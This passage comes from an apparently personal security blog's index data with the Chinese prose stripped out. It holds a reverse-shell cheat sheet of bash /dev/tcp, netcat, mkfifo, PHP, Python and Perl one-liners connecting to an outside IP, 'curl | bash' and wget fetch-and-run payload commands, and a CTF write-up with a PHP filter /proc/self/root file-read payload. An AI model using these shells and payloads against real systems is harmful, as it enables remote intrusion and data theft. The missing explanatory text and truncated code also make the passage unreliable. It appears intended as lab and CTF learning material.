</span><br></pre></td></tr></table></figure>\n<ol>\n<li>bash -i bash</li>\n<li><code>/dev/tcp/ip/port</code> <code>/dev/tcp/</code>Linux,socketsocket&gt;&amp;<code>/dev/tcp/ip/port</code>bash</li>\n<li><code>0&gt;&amp;1</code><code>/dev/tcp/ip/port</code></li>\n</ol>\n<h2 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-e: nc</p>\n</blockquote>\n<p>-e</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>\n<h3 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a><strong></strong>1</h3><p>win7777</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>kali</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002211246793.png\" alt=\"image-20201002211246793\"></p>\n<h3 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h3><p>win</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>kali</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003140303187.png\" alt=\"image-20201003140303187\"></p>\n<p></p>\n<h2 id=\"curl\"><a href=\"#curl\" class=\"headerlink\" title=\"curl\"></a>curl</h2><p>bashcurlshell</p>\n<p>kaliindexbashshell</p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p>kalibash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129</span><br><span class=\"line\"></span><br><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>win</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>curl</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129|bash</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002225540094.png\" alt=\"image-20201002225540094\"></p>\n<h2 id=\"wget\"><a href=\"#wget\" class=\"headerlink\" title=\"wget\"></a>wget</h2><p>wgetphp</p>\n<h3 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h3><p>winshell.txtphp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sock=fsockopen(<span class=\"string\">\"localhost\"</span>,<span class=\"number\">12345</span>);<span class=\"comment\">//localhostip</span></span><br><span class=\"line\">exec(<span class=\"string\">\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>win</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>kaliwgetshell.txtphp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002232826494.png\" alt=\"image-20201002232826494\"></p>\n<h2 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h2><p>curl</p>\n<p>py</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">-*- coding: utf-8 -*-</span></span><br><span class=\"line\">import socket,subprocess,os</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((\"169.254.158.23\",7777)) #localhostip,</span><br><span class=\"line\">os.dup2(s.fileno(),0)</span><br><span class=\"line\">os.dup2(s.fileno(),1)</span><br><span class=\"line\">os.dup2(s.fileno(),2)</span><br><span class=\"line\">p=subprocess.call([\"/bin/sh\",\"-i\"])</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"169.254.158.23\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'</span><br></pre></td></tr></table></figure>\n<p></p>\n<h3 id=\"1-1\"><a href=\"#1-1\" class=\"headerlink\" title=\"1\"></a>1</h3><p>kalipy</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">-*- coding: utf-8 -*-</span></span><br><span class=\"line\">import socket,subprocess,os</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((\"169.254.158.23\",7777)) #localhostip,</span><br><span class=\"line\">os.dup2(s.fileno(),0)</span><br><span class=\"line\">os.dup2(s.fileno(),1)</span><br><span class=\"line\">os.dup2(s.fileno(),2)</span><br><span class=\"line\">p=subprocess.call([\"/bin/sh\",\"-i\"])</span><br></pre></td></tr></table></figure>\n<p>win</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp <span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n<p>kalicurl</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129/shell.py|python</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003131626423.png\" alt=\"image-20201003131626423\"></p>\n<h3 id=\"2-1\"><a href=\"#2-1\" class=\"headerlink\" title=\"2\"></a>2</h3><p>win</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>kali</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133539912.png\" alt=\"image-20201003133539912\"></p>\n<h2 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h2><p>pythoncurl</p>\n<p>phpshell.txt</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sock=fsockopen(<span class=\"string\">\"169.254.158.23\"</span>,<span class=\"number\">7777</span>);<span class=\"comment\">//localhostip</span></span><br><span class=\"line\">exec(<span class=\"string\">\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">'$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"1-2\"><a href=\"#1-2\" class=\"headerlink\" title=\"1\"></a>1</h3><p>kaliphpshell.txt</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sock=fsockopen(<span class=\"string\">\"169.254.158.23\"</span>,<span class=\"number\">7777</span>);<span class=\"comment\">//localhostip</span></span><br><span class=\"line\">exec(<span class=\"string\">\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>win</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp <span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n<p>kalicurl</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129/shell.txt|php</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003132843970.png\" alt=\"image-20201003132843970\"></p>\n<h3 id=\"2-2\"><a href=\"#2-2\" class=\"headerlink\" title=\"2\"></a>2</h3><p>win</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>kali</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">'$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</span></span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133806050.png\" alt=\"image-20201003133806050\"></p>\n<h2 id=\"perl\"><a href=\"#perl\" class=\"headerlink\" title=\"perl\"></a>perl</h2><p></p>\n<p></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"-3\"><a href=\"#-3\" class=\"headerlink\" title=\"\"></a></h3><p>win</p>\n<p>kali</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;</span><br></pre></td></tr></table></figure>\n<p></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>shell</p>\n<p>shell</p>\n","categories":[""],"tags":["shell"]},{"title":"wp","url":"https://pz1o.top/2020/09/28/wp/","content":"<a id=\"more\"></a>\n<h2 id=\"Hitcon2017-babyfirst-reveng\"><a href=\"#Hitcon2017-babyfirst-reveng\" class=\"headerlink\" title=\"Hitcon2017 babyfirst-reveng\"></a>Hitcon2017 babyfirst-reveng</h2><p>github</p>\n<p><a href=\"https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge\" target=\"_blank\" rel=\"noopener\">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>shell</p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $sandbox = <span class=\"string\">'/www/sandbox/'</span> . md5(<span class=\"string\">\"orange\"</span> . $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    @chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">'cmd'</span>]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">        @exec($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'reset'</span>])) &#123;</span><br><span class=\"line\">        @exec(<span class=\"string\">'/bin/rm -rf '</span> . $sandbox);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<p></p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;e\\</span><br><span class=\"line\">&gt;cho\\</span><br><span class=\"line\">&#39;123&#39;</span><br><span class=\"line\">&gt;123</span><br></pre></td></tr></table></figure>\n<p>linux</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># vi 1  //1cat flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># touch flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># echo \"cumtctf&#123;i_am_so_cute&#125;\" &gt;&gt; flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># cat flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># sh 1</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure>\n<p>Linux<code>sh filename</code></p>\n</blockquote>\n<h1 id=\"CUMTCTF2020\"><a href=\"#CUMTCTF2020\" class=\"headerlink\" title=\"CUMTCTF2020\"></a>CUMTCTF2020</h1><h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p>require_once</p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">'HTTP_CLIENT_IP'</span>] != <span class=\"string\">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class=\"string\">'HTTP_X_REAL_IP'</span>] != <span class=\"string\">'127.0.0.1'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>] == <span class=\"string\">\"127.0.0.1\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Sorry, this site is only optimized for those who comes from localhost\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">\"flag.php\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'f'</span>])) </span><br><span class=\"line\">  <span class=\"keyword\">include_once</span>($_POST[<span class=\"string\">'f'</span>]);</span><br></pre></td></tr></table></figure>\n<p><code>reuqire_once</code></p>\n<p><a href=\"https://www.anquanke.com/post/id/213235#h3-2\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/213235#h3-2</a></p>\n<p></p>\n<p>php<strong></strong><code>require_once(&#39;flag.php&#39;)</code>include<code>require_once</code></p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>/proc/self/proc/pid/</p>\n<p>/proc/self/root//</p>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png\" alt></p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h3><p>bcrypt<strong></strong></p>\n<p> </p>\n<p> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'vendor/autoload.php'</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Bcrypt</span>\\<span class=\"title\">Bcrypt</span>;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">ini_set(<span class=\"string\">\"display_errors\"</span>,<span class=\"string\">\"Off\"</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$=<span class=\"keyword\">array</span>(<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span 